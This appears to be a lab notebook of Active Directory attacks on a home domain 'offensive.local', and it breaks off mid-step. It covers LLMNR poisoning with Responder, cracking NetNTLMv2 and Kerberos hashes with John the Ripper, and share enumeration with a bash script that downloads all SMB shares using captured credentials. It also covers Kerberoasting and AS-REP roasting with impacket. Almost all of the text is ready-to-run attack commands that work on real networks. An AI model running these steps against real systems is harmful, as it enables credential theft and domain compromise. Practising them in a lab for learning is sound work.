# LLMNR poisoning

# prerequesite: franky.lanie domain user changes logs in on the Win 10 machine using default password -> is prompted to change the password -> changes it to smth simple: Password123

# 1. on Kali linux: 

sudo responder -I eth1

# 2. on Win 10 client logged in as franky.lanie: File Explorer -> search for \\secretFile  (to initiate LLMNR event)

# 3. on Kali: catch the hash -> put into hash2.txt ; download if needed rockyou.txt
#Run

john --format=netntlmv2 --wordlist=rockyou.txt hash2.txt # to start cracking

john --show hash2.txt # to see the cracked password

###############################################################################################################################################################################################################

# Mapping attack vectors

# Use enum4linux to get all enumeration modules: users, groups, shares, policies, sessions, OS info, etc.
enum4linux-ng 192.168.56.2 -u franky.lanie -p 'Password123' -w offensive.local -A > /tmp/enum_output.txt # save the output to enum_output.txt

# Create a Bash script (smb_enum_download.sh) to automatically to download all shared files from SYSVOL and NETLOGON

#!/bin/bash
SERVER="192.168.56.2"
DOMAIN="offensive.local"
USERNAME="franky.lanie"
PASSWORD="Password123"
OUTPUT_DIR="./smb_downloads"
mkdir -p "$OUTPUT_DIR"

# Function to recursively download files using smbclient
download_share() {
    SHARE=$1
    echo "[*] Connecting to share: $SHARE"

    smbclient "//$SERVER/$SHARE" "$PASSWORD" -U "$DOMAIN\\$USERNAME" -c "
        recurse ON;
        prompt OFF;
        lcd \"$OUTPUT_DIR/$SHARE\";
        mkdir \"$OUTPUT_DIR/$SHARE\";
        cd \\;
        mget *"
}
# Get list of shares
SHARES=$(smbclient -L "//$SERVER" -U "$DOMAIN\\$USERNAME%$PASSWORD" 2>/dev/null | awk '/Disk/ {print $1}' | grep -vE 'ADMIN\$|C\$|IPC\$')

for share in $SHARES; do
    mkdir -p "$OUTPUT_DIR/$share"
    download_share "$share"
done

# Run the Bash script 
chmod +x smb_enum_download.sh                                                                                 
./smb_enum_download.sh

###############################################################################################################################################################################################################

# Kerberoasting

# Required setup for an AD home lab that does not have any service accounts with SPNs registered. In a real setting, it is expected that there are already existing SPNs, so skip this step. 

# 1. First, two service accounts are created, svcWeb with an easy to break password, and svcSQL with a difficult to break password. The motivation for this is investigating how big of a difference a strong password makes in decryption attempts.


# In PowerShell on DC (or other server VM):

# Create account with easy to break password
New-ADUser svcWeb  -SamAccountName svcWeb  -AccountPassword (ConvertTo-SecureString 'iloveyou1' -AsPlainText -Force) -Enabled $true

# Create account with strong password
New-ADUser svcSQL  -SamAccountName svcSQL  -AccountPassword (ConvertTo-SecureString '!TryBr3akMeN0tPoss#bleY' -AsPlainText -Force) -Enabled $true

# 2. Next, we assigned the HTTP service to the svcWeb account (guessable password service account) and registered its SPN. We then configured the MSSQL service under svcSQL (hard to break password) and registered its SPN. 
# Once the SPNs are created in the AD, we can proceed to the attack itself. 


# In PowerShell, still on the DC, run:

# HTTP service on the DC itself
setspn -s HTTP/DomainC.offensive.local svcWeb

# MSSQL service on the DC
setspn -s MSSQLSvc/DomainC.offensive.local:1433 svcSQL


# Attack steps:

# Step 0: Attack prerequisite: A user account with their credentials is needed for the attack. We use the franky.lanie account for which we obtained the password after the LLMNR attack.

# Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket

# Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:
python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2

# Step 2: Make the ticket requests (TGS and TGT).

# Now with the -request flag
python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2 -request

# Step 3: Save the extracted hashes, each in their own txt file. cd to a location where you can create files. We saved them in Documents.

# extract the easy hash  (corresponding to account with weak password) to a txt file
echo 'manually copy eash hash value here' > easy_hash.txt

# extract the hard hash  (corresponding to account with strong password) to a txt file
echo 'manually copy hard hash value here' > hard_hash.txt

# Step 4: use John the Ripper to crack the passwords. To get the tool: sudo apt install john

# wordlist attack using rockyou.txt on the easy hash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt easy_hash.txt 

# wordlist attack using rockyou.txt on the hard hash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hard_hash.txt 

# wordlist attack using rockyou.txt on the hard hash using rules now
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_hash.txt

# brute forcing password
john --format=krb5tgs --incremental hard_hash.txt

###############################################################################################################################################################################################################

# AS-REP roasting

# Prerequisite: At least one domain user has the “Do not require Kerberos preauthentication” flag enabled. 
# In our case, we configured the user bessy.bambie manually in ADUC (Active Directory Users and Computers).

# 1. Create a user list based on earlier enumeration (e.g., via enum4linux or crackmapexec).
echo "bessy.bambie" > users.txt

# 2. Use Impacket's GetNPUsers.py to request AS-REP hashes from the domain controller. 
# This works without authentication for users who have pre-auth disabled.

impacket-GetNPUsers offensive.local/ -dc-ip 192.168.56.2 -no-pass -usersfile users.txt

# 3. If the user is vulnerable, the tool returns an AS-REP hash (format: $krb5asrep$...)
# Copy the full hash output into a file for cracking.

echo '$krb5asrep$23$bessy.bambie@OFFENSIVE.LOCAL:...' > asrep_hashes.txt

# 4. Crack the AS-REP hash offline using John the Ripper ...

###############################################################################################################################################################################################################
